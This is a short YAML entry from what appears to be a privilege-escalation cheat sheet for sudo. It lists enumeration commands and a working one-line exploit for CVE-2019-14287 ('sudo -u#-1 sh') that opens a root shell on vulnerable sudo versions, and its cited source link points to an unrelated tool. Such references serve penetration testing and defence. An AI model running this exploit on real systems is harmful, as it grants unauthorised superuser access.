---
description: |
  sudo allows a permitted user to execute a command as the superuser or another user, as specified by the security policy. <br><br>
  source: https://github.com/DominicBreuker/pspy
functions:
  privesc:
    - description: Check current user's sudo permissions, and sudo version
      code: |
       sudo -l
       sudo -V
    - description: Exploit CVE-2019-14287 (Sudo version < 1.8.28)
      code: |
       sudo -u#-1 sh
---
